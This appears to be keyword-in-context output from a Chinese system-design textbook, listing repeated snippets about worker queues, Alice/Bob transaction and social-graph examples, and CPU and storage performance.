  c27_b10.md: ...否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是否值得？拆分引入哪些权衡？  提示  思考耦合、...
  c27_b10.md: ...立性。服务间通信方式需要改变什么？会引入哪些新故障模式？  **答案：** 应问的问题：(1) profile 数据和 auth 数据是否以不同速率或因不同原因变化？Auth（登录会话、凭证）安全关键且对变化敏感；profile 数据（用户名、简介...
  c27_b10.md: ...故障模式？  **答案：** 应问的问题：(1) profile 数据和 auth 数据是否以不同速率或因不同原因变化？Auth（登录会话、凭证）安全关键且对变化敏感；profile 数据（用户名、简介、照片）对产品功能敏感。不同变化速率暗示不同服...
  c27_b10.md: ...数据（用户名、简介、照片）对产品功能敏感。不同变化速率暗示不同服务。(2) 不同团队是否负责这些职责？若安全团队拥有 auth、产品团队拥有 profile，拆分遵循自然团队边界——主动应用康威定律。(3) 是否有显著运营差异？Auth 需要始终...
  c27_b10.md: ...团队拥有 auth、产品团队拥有 profile，拆分遵循自然团队边界——主动应用康威定律。(3) 是否有显著运营差异？Auth 需要始终高可用性（availability）（登录失败是灾难性的）；profile 数据可容忍短暂中断。不同 SLO...
  c27_b10.md: ...ity）（登录失败是灾难性的）；profile 数据可容忍短暂中断。不同 SLO 暗示不同服务。(4) 是否有性能差异？Auth 在每次 API 调用的关键路径上（每次调用都验证 token）；profile 数据不需要那么频繁。Auth 可能受益...
  c27_b10.md: ...性能差异？Auth 在每次 API 调用的关键路径上（每次调用都验证 token）；profile 数据不需要那么频繁。Auth 可能受益于不同缓存策略。拆分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置...
  c27_b10.md: ...据不需要那么频繁。Auth 可能受益于不同缓存策略。拆分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice ver...
  c27_b10.md: ...署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细...
  c27_b10.md: ...否把 User Service 拆成两个独立服务：Profile Service（处理用户 profile 和设置）和 Auth Service（处理认证和会话管理）。他们应问哪些问题来判断这次拆分是否值得？拆分引入哪些权衡？  提示  思考耦合、...
  c27_b10.md: ...立性。服务间通信方式需要改变什么？会引入哪些新故障模式？  **答案：** 应问的问题：(1) profile 数据和 auth 数据是否以不同速率或因不同原因变化？Auth（登录会话、凭证）安全关键且对变化敏感；profile 数据（用户名、简介...
  c27_b10.md: ...故障模式？  **答案：** 应问的问题：(1) profile 数据和 auth 数据是否以不同速率或因不同原因变化？Auth（登录会话、凭证）安全关键且对变化敏感；profile 数据（用户名、简介、照片）对产品功能敏感。不同变化速率暗示不同服...
  c27_b10.md: ...数据（用户名、简介、照片）对产品功能敏感。不同变化速率暗示不同服务。(2) 不同团队是否负责这些职责？若安全团队拥有 auth、产品团队拥有 profile，拆分遵循自然团队边界——主动应用康威定律。(3) 是否有显著运营差异？Auth 需要始终...
  c27_b10.md: ...团队拥有 auth、产品团队拥有 profile，拆分遵循自然团队边界——主动应用康威定律。(3) 是否有显著运营差异？Auth 需要始终高可用性（availability）（登录失败是灾难性的）；profile 数据可容忍短暂中断。不同 SLO...
  c27_b10.md: ...ity）（登录失败是灾难性的）；profile 数据可容忍短暂中断。不同 SLO 暗示不同服务。(4) 是否有性能差异？Auth 在每次 API 调用的关键路径上（每次调用都验证 token）；profile 数据不需要那么频繁。Auth 可能受益...
  c27_b10.md: ...性能差异？Auth 在每次 API 调用的关键路径上（每次调用都验证 token）；profile 数据不需要那么频繁。Auth 可能受益于不同缓存策略。拆分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置...
  c27_b10.md: ...据不需要那么频繁。Auth 可能受益于不同缓存策略。拆分的权衡：好处：独立部署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice ver...
  c27_b10.md: ...署；安全团队可在不涉及产品团队的情况下迭代 auth；可为每个服务设置不同可靠性目标；不同 on-call 轮值。成本：auth 调用 profile 或 vice versa 时新增网络 hop；分布式追踪现在覆盖两个服务；任一服务故障都需要仔细...
  c28_b20.md: ...进程内。这培养架构习惯。在实施前文档化“未来服务边界”。阶段 2（6–12 个月，20 → 35 人）：提取前两个服务：Auth 和 Notifications（都是低风险、边界清晰）。围绕这两个服务各组 6 人团队。剩余 23 人拥有核心单体。这...

=== worker (46 occurrences) ===
  c08_b11.md: ...消费者。多个消费者竞争队列中的消息——这对并行化工作有用（多个 worker 处理同一队列的订单）。但每条消息只到一个 worker。  在 **pub-sub** 中，发布到主题的消息投递给所有订阅者。每个订阅者得到自己的副本。订阅者相互独立——新增...
  c08_b11.md: ...服务要向四个队列发布。Pub-sub 把它合并：一个主题、四个订阅者、一次发布。  **选择点对点当：** 你想让多个 worker 处理同一队列以并行化工作。十个邮件服务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 work...
  c08_b11.md: ...题、四个订阅者、一次发布。  **选择点对点当：** 你想让多个 worker 处理同一队列以并行化工作。十个邮件服务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自...
  c08_b11.md: ...rker 处理同一队列以并行化工作。十个邮件服务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fa...
  c08_b11.md: ...务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 →...
  c08_b11.md: ...味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型...
  c08_b11.md: ...组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型内部用点对点（该类型的多个 worker 共享一个队列）。  **Q4.** 消息消费者“幂等”是什么意思？为什么幂等性对至少一次投递系统是必需的？  **答案...
  c09_b18.md: ...，这就像把每个服务员绑定到特定桌子——如果某桌点了十二道菜，那个服务员过载，而其他服务员闲着。消息队列的修复方法是多个 worker 共享一个队列（任何 worker 可处理任何消息）。会话的修复方法是共享会话存储（任何服务器可处理任何用户）。两种方案...
  c10_b13.md: ...ideo.transcoding_complete` 事件给任何下游消费者（通知上传者、搜索索引更新等）。  多个转码 worker 并行读取队列（点对点队列，第 8 章）：10 个 worker 可同时转码 10 个视频，为计算密集型步骤提供水平扩展...
  c10_b13.md: ...下游消费者（通知上传者、搜索索引更新等）。  多个转码 worker 并行读取队列（点对点队列，第 8 章）：10 个 worker 可同时转码 10 个视频，为计算密集型步骤提供水平扩展。  **服务路径：**  视频使用 **HLS（HTTP Li...
  c13_b04.md: ...己的服务。SocialSnap 的图片上传功能比消息功能需要更多计算（缩略图生成、对象存储上传）。把它们分开，图片上传 worker 可以独立于消息 worker 扩展。  **线索 2：独立容错。** 有些功能是核心——如果用户服务故障，没人能登录，...
  c13_b04.md: ...的图片上传功能比消息功能需要更多计算（缩略图生成、对象存储上传）。把它们分开，图片上传 worker 可以独立于消息 worker 扩展。  **线索 2：独立容错。** 有些功能是核心——如果用户服务故障，没人能登录，整个应用宕机。其他功能是补充—...
  c15_b01.md: ...第 8 章的消息队列。我们用它把欢迎邮件从注册流程解耦：用户注册时，应用向队列发布“发送欢迎邮件”消息并立即返回。后台 worker 消费消息并异步发邮件。如果邮件服务宕机，消息在队列中等待直到恢复。  同样机制——把工作发布到队列供后台处理——也适用...
  c15_b01.md: ...请求处理器里同步执行全部三步（中途失败会留下部分状态并让用户等待），而是把意图发布到队列并向用户返回“处理中”。后台 worker 可靠地处理这些步骤。  这就是**任务队列（task queue）**架构：把可能耗时、有外部依赖或需要重试逻辑的操作...
  c15_b01.md: ...任务队列（task queue）**架构：把可能耗时、有外部依赖或需要重试逻辑的操作从请求处理路径卸载到队列，由专门的 worker 异步处理。...
  c15_b02.md: ...#### 定义：任务队列  **任务队列（task queue）** 是用来把工作单元（任务）分发给 worker 进程池的消息队列。生产者（通常是请求处理器）向队列发布任务。Worker 消费任务、执行并确认完成。失败的任务通常自动...
  c15_b02.md: ...eue）** 是用来把工作单元（任务）分发给 worker 进程池的消息队列。生产者（通常是请求处理器）向队列发布任务。Worker 消费任务、执行并确认完成。失败的任务通常自动重试。  plain 语言：任务队列就是待办清单。你的 HTTP 处理器在...
  c15_b02.md: ...试。  plain 语言：任务队列就是待办清单。你的 HTTP 处理器在清单上写“向用户 42 收取高级版费用”。后台 worker 拿起任务、完成、划掉。如果 worker 在任务中途崩溃，任务回到清单上再试一次。  任务队列与第 8 章的消息队列主...
  c15_b02.md: ...清单。你的 HTTP 处理器在清单上写“向用户 42 收取高级版费用”。后台 worker 拿起任务、完成、划掉。如果 worker 在任务中途崩溃，任务回到清单上再试一次。  任务队列与第 8 章的消息队列主要在使用模式上不同：消息队列关乎事件通知与...
  c15_b02.md: ...使用模式上不同：消息队列关乎事件通知与解耦（某事发生了；感兴趣的各方被通知），而任务队列关乎分发工作（某事必须做；指定 worker 去做）。底层机制通常相同（RabbitMQ、Amazon SQS、Redis），只是用法不同。   #### 定时任务...
  c15_b02.md: ...#### 定义：任务队列  **任务队列（task queue）** 是用来把工作单元（任务）分发给 worker 进程池的消息队列。生产者（通常是请求处理器）向队列发布任务。Worker 消费任务、执行并确认完成。失败的任务通常自动...
  c15_b02.md: ...eue）** 是用来把工作单元（任务）分发给 worker 进程池的消息队列。生产者（通常是请求处理器）向队列发布任务。Worker 消费任务、执行并确认完成。失败的任务通常自动重试。  plain 语言：任务队列就是待办清单。你的 HTTP 处理器在...
  c15_b02.md: ...试。  plain 语言：任务队列就是待办清单。你的 HTTP 处理器在清单上写“向用户 42 收取高级版费用”。后台 worker 拿起任务、完成、划掉。如果 worker 在任务中途崩溃，任务回到清单上再试一次。  任务队列与第 8 章的消息队列主...
  c15_b02.md: ...清单。你的 HTTP 处理器在清单上写“向用户 42 收取高级版费用”。后台 worker 拿起任务、完成、划掉。如果 worker 在任务中途崩溃，任务回到清单上再试一次。  任务队列与第 8 章的消息队列主要在使用模式上不同：消息队列关乎事件通知与...
  c15_b02.md: ...使用模式上不同：消息队列关乎事件通知与解耦（某事发生了；感兴趣的各方被通知），而任务队列关乎分发工作（某事必须做；指定 worker 去做）。底层机制通常相同（RabbitMQ、Amazon SQS、Redis），只是用法不同。   #### 定时任务...
  c15_b03.md: ...恰好一次”？因为分布式系统中实现**恰好一次投递（exactly-once delivery）**本质上很难。  考虑：worker 收到任务，处理它，然后——就在向队列确认消息前——worker 崩溃。队列没收到确认。从队列视角，任务从未成功处理。超...
  c15_b03.md: ...-once delivery）**本质上很难。  考虑：worker 收到任务，处理它，然后——就在向队列确认消息前——worker 崩溃。队列没收到确认。从队列视角，任务从未成功处理。超时后，队列把消息重新投递给另一个 worker。  现在任务被执...
  c15_b03.md: ...队列确认消息前——worker 崩溃。队列没收到确认。从队列视角，任务从未成功处理。超时后，队列把消息重新投递给另一个 worker。  现在任务被执行了两次。如果任务是“给用户 42 发邮件”，用户 42 收到两封邮件。如果任务是“给用户 42 信用...
  c15_b04.md: ...`upgrade_key` 和结果记录到已处理操作表，返回结果。 4. 若见过：返回存储的结果，不再扣款。  现在如果 worker 在扣款后、确认消息前崩溃，消息会被重新投递。重试查找 `upgrade_key`，发现已处理，返回存储结果，不再扣款。...
  c22_b07.md: ...，现在应用于 feed 投递规模。它是扇出架构的心脏：  * **水平可扩展：** 多个 Fanout Service worker 并行消费 Kafka topic。如果某帖子有 50 万（500,000）关注者，工作被分散到多个 worker。10...
  c22_b07.md: ...ce worker 并行消费 Kafka topic。如果某帖子有 50 万（500,000）关注者，工作被分散到多个 worker。10 个 worker 各处理 5 万（50,000）次关注者更新。 * **限速：** 50 万关注者帖子的扇出无法...
  c22_b07.md: ...消费 Kafka topic。如果某帖子有 50 万（500,000）关注者，工作被分散到多个 worker。10 个 worker 各处理 5 万（50,000）次关注者更新。 * **限速：** 50 万关注者帖子的扇出无法瞬间完成。Fanout...
  c22_b07.md: ...nout Service 在数秒内追上典型关注者数。  对 50 万（500,000）关注者用户，以每个 Fanout worker 每秒 1 万（10,000）次 Redis 写入，单个 worker 50 秒完成扇出——刚好在 60 秒新鲜度 SL...
  c22_b07.md: ...500,000）关注者用户，以每个 Fanout worker 每秒 1 万（10,000）次 Redis 写入，单个 worker 50 秒完成扇出——刚好在 60 秒新鲜度 SLO 内。10 个 worker 并行：5 秒。Fanout worke...
  c22_b07.md: ...0,000）次 Redis 写入，单个 worker 50 秒完成扇出——刚好在 60 秒新鲜度 SLO 内。10 个 worker 并行：5 秒。Fanout worker 数量是新鲜度延迟的直接杠杆。...
  c22_b07.md: ...orker 50 秒完成扇出——刚好在 60 秒新鲜度 SLO 内。10 个 worker 并行：5 秒。Fanout worker 数量是新鲜度延迟的直接杠杆。...
  c24_b06.md: ...态：给定上传会话已收到哪些块？  上传完成后，摄取服务触发转码流水线：向队列发布消息（回忆第 8 章消息队列），由转码 worker 消费。队列把摄取（必须快而可靠）与转码（计算密集且较慢）解耦。如果转码暂时不可用，上传继续——消息在队列中累积，wor...
  c24_b06.md: ...ker 消费。队列把摄取（必须快而可靠）与转码（计算密集且较慢）解耦。如果转码暂时不可用，上传继续——消息在队列中累积，worker 恢复后处理。   #### 为什么这里队列必不可少  考虑替代方案：摄取服务同步调用转码服务。如果转码慢（4K 视频可...
  c24_b06.md: ...来，视频流架构有三大子系统：  **摄取路径（上传与转码）：**  * 上传服务（分块、可续传上传）→ 队列 → 转码 worker（每视频片段极度并行）→ 编码片段写入分层 blob 存储 → 生成并存储清单  **分发路径（CDN 交付）：**...
  c27_b02.md: ...），后端先由 Redis 支持，可靠性要求提高后换成 RabbitMQ。通知发送、邮件投递、feed 更新计算移到异步 worker。  **关键决策：**  * 欢迎邮件、帖子通知、关注通知都变成异步任务 * API 响应再次即时——通知“发后不管”...
  c27_b02.md: ...**关键决策：**  * 欢迎邮件、帖子通知、关注通知都变成异步任务 * API 响应再次即时——通知“发后不管” * Worker 运行在独立服务器，独立可扩展  **为什么正确：** 通知和邮件不应在用户动作的关键路径上。通过队列解耦使团队能独立扩...
  c27_b02.md: ...过队列解耦使团队能独立扩展每个关注点，并让系统对邮件提供商故障有韧性（邮件排队并重试，不丢失）。  **技术债务：** Worker 任务失败开始静默。团队没有对队列深度或任务失败率做充分监控。两周内，一个 subtle bug 导致 15% 欢迎邮件...
  c27_b02.md: ...），后端先由 Redis 支持，可靠性要求提高后换成 RabbitMQ。通知发送、邮件投递、feed 更新计算移到异步 worker。  **关键决策：**  * 欢迎邮件、帖子通知、关注通知都变成异步任务 * API 响应再次即时——通知“发后不管”...
  c27_b02.md: ...**关键决策：**  * 欢迎邮件、帖子通知、关注通知都变成异步任务 * API 响应再次即时——通知“发后不管” * Worker 运行在独立服务器，独立可扩展  **为什么正确：** 通知和邮件不应在用户动作的关键路径上。通过队列解耦使团队能独立扩...
  c27_b02.md: ...过队列解耦使团队能独立扩展每个关注点，并让系统对邮件提供商故障有韧性（邮件排队并重试，不丢失）。  **技术债务：** Worker 任务失败开始静默。团队没有对队列深度或任务失败率做充分监控。两周内，一个 subtle bug 导致 15% 欢迎邮件...
  c28_b14.md: ...24) | 高（离线批量；非实时） | 最终（上传到可用有延迟） | 高（队列缓冲故障） | 高——编解码配置、并行 worker **Adaptive bitrate streaming (ABR)** (Ch 24) | 极低（客户端算法） |...

=== bob (44 occurrences) ===
  c05_b01.md: ...lice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol...
  c05_b01.md: ...alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol | caro...
  c05_b01.md: ...d SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" | 2024-01-22 |...
  c05_b01.md: ...lice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol...
  c05_b01.md: ...alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol | caro...
  c05_b01.md: ...d SocialSnap!" | 2024-01-15 | | 102 | 2 | "Hello world from Bob" | 2024-01-21 | | 103 | 1 | "Second post!" | 2024-01-22 |...
  c05_b04.md: ...留下任何痕迹。没有“半完成”状态会被其他用户看到。  考虑 SocialSnap 的“关注用户”操作。Alice 关注 Bob 时，我们需要：  1. 在 `follows` 表中插入一行：`(follower_id=1, followed_id...
  c05_b04.md: ...1. 在 `follows` 表中插入一行：`(follower_id=1, followed_id=2)` 2. 把 Bob 的 `follower_count` 加 1 3. 把 Alice 的 `following_count` 加 1...
  c05_b04.md: ...第 2 步成功而第 3 步崩溃，Alice 的计数就错了。如果第 1 步成功而第 2 步崩溃，Alice 被列为关注了 Bob，但 Bob 的计数没增加。  事务把三步包起来。任何一步失败，所有步骤都像没发生过一样回滚。   #### ACID...
  c05_b04.md: ...功而第 3 步崩溃，Alice 的计数就错了。如果第 1 步成功而第 2 步崩溃，Alice 被列为关注了 Bob，但 Bob 的计数没增加。  事务把三步包起来。任何一步失败，所有步骤都像没发生过一样回滚。   #### ACID 性质  关系...
  c05_b06.md: ...lowed_id)` 有两个作用：它创建唯一约束（你不能关注同一个人两次），并创建复合索引，让 “Alice 是否关注 Bob？” 能快速查找。  **主页 Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子”：      S...
  c05_b08.md: ...性质。对每一性质，描述如果它被违反会发生什么。  **答案：** 考虑一笔从 Alice 账户转 100 USD 到 Bob 账户的转账，实现为两条 SQL 更新。  **没有原子性：** 从 Alice 扣款（`balance -= 100`...
  c05_b08.md: ...实现为两条 SQL 更新。  **没有原子性：** 从 Alice 扣款（`balance -= 100`）成功，但给 Bob 加款（`balance += 100`）失败（磁盘满、崩溃等）。现在 Alice 少了 100 USD，但 Bob 没...
  c05_b08.md: ...给 Bob 加款（`balance += 100`）失败（磁盘满、崩溃等）。现在 Alice 少了 100 USD，但 Bob 没收到。钱消失了。有了原子性，两条更新要么都成功，要么都不成功——没有部分状态。  **没有一致性：** 约束规定账户...
  c05_b08.md: ...余额变成 -50 USD。有了一致性，数据库会整体拒绝违反非负余额约束的事务。  **没有隔离性：** Alice 和 Bob 同时从同一个 100 USD 账户转出 100 USD。没有隔离，两个事务都读到当前余额 100 USD，都判断可以执...
  c05_b13.md: ...` 表已记录新关系，但 `follower_count` 没有递增。现在 `follows` 显示 Alice 关注了 Bob，但 Bob 的 `follower_count` 少了 1。  在规模下，类似的部分失败会累积。例如删除垃圾账号的后台...
  c05_b13.md: ...新关系，但 `follower_count` 没有递增。现在 `follows` 显示 Alice 关注了 Bob，但 Bob 的 `follower_count` 少了 1。  在规模下，类似的部分失败会累积。例如删除垃圾账号的后台任务可能从...
  c06_b01.md: ...么？  再考虑另一个案例：一个社交网络存储 200 百万（2 亿）用户，需要在 10 ms 内回答“Alice 是不是 Bob 的朋友？”。友谊图有 50 billion（500 亿）条边。在关系型数据库中，回答“Alice 是不是 Bob 的朋...
  c06_b01.md: ...不是 Bob 的朋友？”。友谊图有 50 billion（500 亿）条边。在关系型数据库中，回答“Alice 是不是 Bob 的朋友？”是单次索引查找。但“Alice 的所有朋友的朋友都有谁？”——典型的社交图遍历——需要把友谊表与自身 joi...
  c06_b05.md: ...oin。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob (id: 2)       → FRIENDS_WITH → Node: Carol (id: 3)       →...
  c06_b05.md: ...id: 3)       → FRIENDS_WITH → Node: Dave (id: 4)      Node: Bob (id: 2)       → FRIENDS_WITH → Node: Eve (id: 5)       → FR...
  c06_b08.md: ...库不能。使用每种数据库物理上如何查找相关数据的概念。  **答案：** 在关系型数据库中，每个关系都是表中的一行。要找 Bob 的朋友，数据库必须搜索 `friendships` 表中所有 `user_id = bob_id` 的行。这在有索引时...
  c06_b08.md: ...bob_id` 的行。这在有索引时很快，但仍必须从磁盘或内存读取匹配行。  要找朋友的朋友（2 跳），数据库必须先找到 Bob 的朋友（查找 1），然后对每个朋友再找到他们的朋友（N 次额外查找，每个朋友一次）。有合适索引时，每次查找都快，但总工...
  c06_b08.md: ...（查找 1），然后对每个朋友再找到他们的朋友（N 次额外查找，每个朋友一次）。有合适索引时，每次查找都快，但总工作量与 Bob 的朋友列表大小乘以每个朋友的朋友列表大小成正比。3 跳或更多跳，工作量再次成倍增加。  根本问题：**关系型数据库把关...
  c06_b08.md: ...据**（表中的行），访问这些数据每次都要回到数据库引擎。  在图数据库中，节点有**直接指针**指向它们连接的节点。找 Bob 的朋友意味着直接跟随 Bob 节点中存储的指针——没有表查找，只有指针解引用。找朋友的朋友意味着从每个朋友的节点跟随指...
  c06_b08.md: ...据每次都要回到数据库引擎。  在图数据库中，节点有**直接指针**指向它们连接的节点。找 Bob 的朋友意味着直接跟随 Bob 节点中存储的指针——没有表查找，只有指针解引用。找朋友的朋友意味着从每个朋友的节点跟随指针——仍然是指针解引用。每一跳...
  c08_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想增加“帖子被赞”通知：当 Alice 点赞 Bob 的帖子，Bob 在通知中心收到通知。这是高容量事件（每天数百万赞）。用消息队列为该功能设计消息流。包括：事件 sche...
  c08_b12.md: ...### 应用问题  **Q1.** SocialSnap 想增加“帖子被赞”通知：当 Alice 点赞 Bob 的帖子，Bob 在通知中心收到通知。这是高容量事件（每天数百万赞）。用消息队列为该功能设计消息流。包括：事件 schema、谁发布和谁...
  c08_b12.md: ...schema、谁发布和谁消费、你会选择哪种投递保证、以及如何处理幂等性要求。  提示  想想通知服务需要哪些信息来构建 Bob 的通知。然后想故障情况：如果通知被投递两次，Bob 会看到两条“Alice 赞了你的帖子”通知吗？  **答案：**...
  c08_b12.md: ...以及如何处理幂等性要求。  提示  想想通知服务需要哪些信息来构建 Bob 的通知。然后想故障情况：如果通知被投递两次，Bob 会看到两条“Alice 赞了你的帖子”通知吗？  **答案：**  **事件 schema：**       {...
  c08_b12.md: ...e 的客户端返回 HTTP 200  **消费者：** 通知服务，读取 `post.liked` 事件并：  1. 为 Bob（`user_id=7`）创建通知记录 2. 如果 Bob 在线，推送通知计数更新（通过 WebSocket，第 9 章...
  c08_b12.md: ...知服务，读取 `post.liked` 事件并：  1. 为 Bob（`user_id=7`）创建通知记录 2. 如果 Bob 在线，推送通知计数更新（通过 WebSocket，第 9 章会讲）  **投递保证：** 至少一次。我们不能丢失点赞通...
  c09_b13.md: ...送。没有轮询、没有重复连接、亚秒级投递。  **WebSocket 是正确选择：** 实时聊天应用。当 Alice 给 Bob 发消息，Bob 的浏览器应立刻显示，无需轮询。服务器一收到消息就通过 Bob 打开的 WebSocket 连接推送。轮...
  c09_b13.md: ...有重复连接、亚秒级投递。  **WebSocket 是正确选择：** 实时聊天应用。当 Alice 给 Bob 发消息，Bob 的浏览器应立刻显示，无需轮询。服务器一收到消息就通过 Bob 打开的 WebSocket 连接推送。轮询会带来 5-3...
  c09_b13.md: ...：** 实时聊天应用。当 Alice 给 Bob 发消息，Bob 的浏览器应立刻显示，无需轮询。服务器一收到消息就通过 Bob 打开的 WebSocket 连接推送。轮询会带来 5-30 秒延迟（取决于轮询间隔）和巨大服务器开销。  **HTTP...
  c09_b16.md: ...**答案：**  **端到端架构：**  **第 1 步：记录 like 事件** Bob 赞了 Alice 的帖子。应用服务器：  * 把 like 插入 PostgreSQL（`likes` 表） * 发布...
  c09_b16.md: ...ostgreSQL（`likes` 表） * 发布 `post.liked` 事件到消息队列（第 8 章） * 立即向 Bob 返回 HTTP 200  **第 2 步：通知服务消费事件** 通知服务（第 8 章的消息队列消费者）从队列读取 `p...
  c11_b01.md: ...},         "sess_b8c4d0e5f2a3": {"user_id": 7, "username": "bob", "created_at": ...},         ...     }   当带 cookie `sess_a...
  c12_b07.md: ...一用户的数据落在同一 shard——这个特定问题被避免了。  但考虑转账操作：用户 Alice（Shard 1）给用户 Bob（Shard 3）送礼。扣减 Alice 余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到...
  c12_b07.md: ...但考虑转账操作：用户 Alice（Shard 1）给用户 Bob（Shard 3）送礼。扣减 Alice 余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、B...
  c12_b07.md: ...（Shard 3）送礼。扣减 Alice 余额，增加 Bob 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distribut...
  c12_b07.md: ...b 余额。这些更新必须原子——不能扣了 Alice 却没加到 Bob，让钱消失在虚空中。Alice 在 Shard 1、Bob 在 Shard 3，这就是**分布式事务（distributed transaction）**。   #### 定义：...
  c14_b10.md: ...时，不同读者可能因访问的副本及该副本落后程度不同而看到不同值。  强一致性必要场景：用户银行余额。如果 Alice 给 Bob 转 100 USD，Alice 账户扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前 Alice...
  c14_b10.md: ...到不同值。  强一致性必要场景：用户银行余额。如果 Alice 给 Bob 转 100 USD，Alice 账户扣减和 Bob 账户贷记必须强一致。如果任一节点的后续读仍能返回转账前 Alice 的余额，她可能再次转出同样 100 USD，导致双...

=== cpu (43 occurrences) ===
  c01_b10.md: ...响力的改动**，并解释为什么是先做这两个，而不是别的。  提示  想想单台机器上的单体应用在流量尖峰时实际耗尽的是什么：CPU、内存、数据库连接，还是三者都有？把“最先崩溃的是什么？”与“长期架构修复是什么？”分开。前两个改动应该便宜且可快速部署...
  c03_b01.md: ...致正确：  | 操作 | 近似延迟 | 直观感受 | |---|---|---| | L1 缓存引用 | 1 ns | CPU 能做的最快的事 | | L2 缓存引用 | 4 ns | 比 L1 慢约 4 倍 | | RAM 访问 | 100 n...
  c03_b04.md: ...Gbps  一台典型服务器的网卡是 1–10 Gbps。这意味着仅处理网络带宽就需要至少 2–20 台服务器，还没考虑 CPU 负载。  **写带宽（接收用户上传的数据）：**  * 新帖子：1000 万活跃用户 × 每天 2 帖 = 每天 20...
  c03_b09.md: ...律，而不是代码质量，损失了一半国际用户。CDN 直接解决这个问题；更大的服务器不行——当瓶颈是跨大西洋的光速时，服务器 CPU 速度无关紧要。”  这说明延迟表不只是琐事——它是把地理分布翻译成用户体验和商业影响的计算器。...
  c05_b07.md: ...库层每秒约 35 次点赞动作，并且还在增长。接近的限制是：  **写入瓶颈：** 所有写入都到一台机器。一台磁盘和一个 CPU 处理写入的物理速度有限。典型单服务器 PostgreSQL 写入限制：每秒 1000–5000 事务，取决于硬件和事务...
  c06_b03.md: ...网络 I/O……）。那就是每秒 500,000 次写入，持续不断。你需要查询：“给我过去 24 小时 A 集群服务器的 CPU 利用率，1 分钟粒度。”  这对关系型数据库来说是 terrible 的匹配：  * 每秒 500,000 次写入超过...
  c06_b04.md: ...Columns: timestamps → metric values       "09:00:00" → {cpu: 45, mem: 72, disk_io: 12, ...}       "09:00:01" → {cpu: 47...
  c06_b04.md: ...→ {cpu: 45, mem: 72, disk_io: 12, ...}       "09:00:01" → {cpu: 47, mem: 72, disk_io: 14, ...}       ...       "09:59:59"...
  c06_b04.md: ...7, mem: 72, disk_io: 14, ...}       ...       "09:59:59" → {cpu: 43, mem: 71, disk_io: 11, ...}   某台服务器某天的所有指标连续存储。查询“给我 se...
  c07_b01.md: ...，被更大的平台转发。流量在 20 分钟内从 200 请求/秒飙升到 8,000 请求/秒。每个请求都命中数据库。数据库 CPU 爬到 100%。查询开始排队。p99 延迟从安静下午的 80ms 变成 4 秒。用户看到白屏。这本该是 SocialS...
  c10_b02.md: ...比旋转硬盘快，但比 DRAM 慢。速度层级对应成本层级。  这是从最快最贵到最慢最便宜的存储层级：  **第 1 级：CPU 寄存器和缓存（L1/L2/L3）**  * 速度：亚纳秒级访问（0.5–10 纳秒） * 成本：约 100,000 U...
  c10_b02.md: ...L2/L3）**  * 速度：亚纳秒级访问（0.5–10 纳秒） * 成本：约 100,000 USD/GB（实际上是 CPU 裸片成本的一部分） * 容量：千字节（L1）到兆字节（L3） * 存放内容：CPU 当前正在执行的活动变量和指令  *...
  c10_b02.md: ...0,000 USD/GB（实际上是 CPU 裸片成本的一部分） * 容量：千字节（L1）到兆字节（L3） * 存放内容：CPU 当前正在执行的活动变量和指令  **第 2 级：DRAM（内存）**  * 速度：约 100 纳秒（0.1 微秒） *...
  c11_b06.md: ...**真正无状态：** 不需要 Redis 会话存储。每个请求都不需要外部查找。服务器用加密方式验证 JWT——这是 CPU 操作，不是网络操作。与每次请求约 1ms 的 Redis 查找相比，这是 0ms 网络延迟。  **水平扩展：** 任...
  c11_b07.md: ...因为这些术语会不断出现。   #### 定义：垂直扩展（Scale Up）  **垂直扩展**指增加单台机器资源：更多 CPU 核心、更大 RAM、更快存储。目标是让现有服务器更有能力。  plain 语言：垂直扩展就是升级机器。  **优点：*...
